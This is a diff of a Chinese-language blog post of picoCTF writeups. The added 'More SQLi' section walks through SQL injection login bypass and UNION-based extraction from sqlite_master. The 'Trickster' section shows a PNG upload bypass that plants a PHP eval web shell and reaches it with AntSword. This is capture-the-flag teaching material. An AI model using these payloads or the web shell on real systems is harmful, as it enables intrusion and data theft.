@@ -6,10 +6,10 @@ categories:
 mathjax: true
 ---
 # 前言
-TODO
+其實好像也沒什麼好講前言的，但就是不想要一開始就是題目分類，所以還是放了個前言XD。總之呢這裡就是會盡量彙整所有的picoCTF的題目在這邊（但是因為已經寫了60題左右才開始打算來寫writeup，所以可能前面的部分會等其他都寫完再來補），如果有需要就可以直接來這邊看所有的writeup，就這樣啦！希望能幫忙到你。
 # Web
 ## picobrowser
-這題我們點進URL後會看到一個FLAG的按鈕，按下去會發現我們不能得到FLAG。![](https://hackmd.io/_uploads/SJB9S0p70.png)
+這題我們點進URL後會看到一個FLAG的按鈕，按下去會發現我們不能得到FLAG。![image](https://hackmd.io/_uploads/SJB9S0p70.png)
 他說我們應該要是picobrowser，所以我就寫了一個selenium的Python腳本來運行，看看能不能拿到flag。
 ```python=
 from selenium import webdriver
@@ -32,6 +32,108 @@ time.sleep(1337)
 ```
 picoCTF{p1c0_s3cr3t_ag3nt_84f9c865}
 ```
+## More SQLi
+把題目launch了之後會進入到一個登入頁面，如下圖。
+
+![題目](https://hackmd.io/_uploads/BySNOmYUC.png)
+
+然後我們先嘗試使用`admin`作為帳號密碼登入。帳號密碼都輸入`admin`後按下登入，網頁會渲染一個我們剛剛輸入的帳號密碼，以及後台的使用者資訊的查詢語句，如下。
+
+![image](https://hackmd.io/_uploads/r1wnu7KIR.png)
+
+圖片有點小，總之他顯示的內容就是像下面這樣:
+```
+username: admin
+password: admin
+SQL query: SELECT id FROM users WHERE password = 'admin' AND username = 'admin'
+```
+所以我們在這邊把密碼用`'OR 1=1 --`這串payload作為輸入（帳號可以隨便輸入），整個SQL的query就會變成這樣:
+```sql=
+SELECT id FROM users WHERE password = ''OR 1=1 --' AND username = 'admin'
+```
+可以從上面的代碼高亮的顏色發現，在`1=1`後面的東西都被註解掉了，所以就可以直接登入系統啦！登入後會看到以下的介面:
+
+![image](https://hackmd.io/_uploads/rJjw6XYUC.png)
+
+他可以查詢City的名稱，但其實一筆資料包含了City, Address, Phone。分析一下後台可能的SQL語句，應該是如下:
+```sql=
+SELECT city, address, phone FROM {TABLE_NAME} WHERE city = '';
+```
+再來因為題目有告訴我們系統使用的是SQLite，所以會有一個叫做`sqlite_master`的表來儲存一些表格的各種資訊。（[資訊來源](https://blog.csdn.net/luoshabugui/article/details/108327936)）
+
+知道這些候我們輸入`' UNION SELECT name, sql, 1337 FROM sqlite_master; --`讓整個SQL語句變成如下
+```sql=
+SELECT city, address, phone FROM {TABLE_NAME} WHERE city = '' UNION SELECT name, sql, 1337 FROM sqlite_master; --';
+```
+這邊我們使用聯集合併兩個查詢結果，因為第一個結果為空集合，所以返回的結果就會是sqlite_master的表格內容，如下:
+
+![image](https://hackmd.io/_uploads/BysgmNY8R.png)
+
+我們可以看到被紅色框框圈住的地方就是我們所想獲得的flag，既然知道表格名稱，也知道表格的結構了，就把它查詢出來吧！使用這段payload`' UNION SELECT 1, flag, 1 FROM more_table; --`。輸入後就可以看到以下的介面啦！
+
+![image](https://hackmd.io/_uploads/SyoSNNtLA.png)
+
+flag就找到囉！
+```
+picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}
+```
+
+## Trickster
+這題的題目是一個可以上傳png的網頁，看起來就是文件上船漏洞，頁面如下:
+
+![題目](https://hackmd.io/_uploads/HkocKNtIA.png)
+
+~~秉持著不知道要幹嘛的時候先掃路徑的精神~~，可以找到它的robots.txt，它其中禁止了兩個路徑，如下:
+```
+User-agent: *
+Disallow: /instructions.txt
+Disallow: /uploads/
+```
+既然它都禁止了，我們就去看看吧XD。`/uploads/`應該就是它的上船後的文件路徑了，而它instructions.txt的內容如下:
+```
+Let's create a web app for PNG Images processing.
+It needs to:
+Allow users to upload PNG images
+	look for ".png" extension in the submitted files
+	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
+after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
+```
+所以我們知道後端驗證檔案是否為png的方法有二，其一為檢查文件後綴名是否為`.png`；其二為驗證文件的magic bytes，看文件在十六進制中的前幾個位元組是否為`50 4E 47`。
+
+知道了這些信息後，我們先隨便找一張png圖片上傳看看吧！（我這邊直接隨便截圖，並命名為`hack.png`）。並且在upload的過程中用Burp suite去攔截封包，並修改其中的檔案名稱及檔案內容。這邊把檔案名稱改為`hack.png.php`，並在檔案內容的PNG以下添加這個[php一句話木馬](https://xz.aliyun.com/t/6957?time__1311=n4%2BxnD0DRDyD9iDuDRhxBqOoQRQ40xAK5q5vKx&alichlgref=https%3A%2F%2Fwww.google.com%2F)
+```php=
+<?php @eval($_POST['shell']);?>
+```
+整個修改完後如下（點開來看可能會比較清楚）:
+
+![image](https://hackmd.io/_uploads/Sy7rFrYU0.png)
+
+上傳完成後，現在這個shell就會位於`https://my_instance_url/uploads/hack.png.php`這個位置上啦。
+
+接下來再用[中國蟻劍](https://github.com/AntSwordProject/antSword)這款工具去連接那個web shell就可以啦，連接過程如下:
+
+![輸入連接資訊](https://hackmd.io/_uploads/HJo4cSF8A.png)
+
+連接完成後，就可以直接看一下網站的文件，看到以下這個`.txt`應該就是flag了。
+
+![貌似是flag的文件](https://hackmd.io/_uploads/SyahqSYLR.png)
+
+![flag出來了](https://hackmd.io/_uploads/HJW1sBtI0.png)
+
+於是我們就成功找到了flag啦！如下:
+```
+picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_d3ac625b}
+```
+這邊補充一個知識點，來講一下`<?php @eval($_POST['shell']);?>`到底是在做啥。但因為我也不是很熟php，所以我們來看看ChatGPT大神是怎麼回答的吧！
+>當然，這段PHP代碼的原理是允許遠程執行伺服器上的PHP代碼。這是如何工作的：
+>1. `<?php` 是PHP代碼的開始標記。
+>2. `@eval($_POST['shell']);` 中的 `eval()` 函數執行傳遞給它的字符串作為PHP代碼。這裡的代碼來自於HTTP POST請求中名為 `shell` 的變量。
+>3. `@` 符號用來抑制任何錯誤信息，這樣用戶不會看到執行過程中產生的任何錯誤。
+>4. 由於這段代碼執行任意PHP代碼，它使得伺服器容易受到攻擊，因此屬於一種非常危險的做法。
+>
+>簡言之，任何通過 `shell` 變量傳送的代碼都將被伺服器執行，這可以用於各種目的，包括但不限於數據讀取、文件操作等。
+
+然後我後來找到了另一篇writeup，它的payload比較酷，是一個即時執行的input框，有興趣可以去看一下[這篇](https://medium.com/@niceselol/picoctf-2024-trickster-af90f7476e18)。
 
 # Crypto
 >[My scripts & note on Github](https://github.com/CX330Blake/Crypto_Notebook)
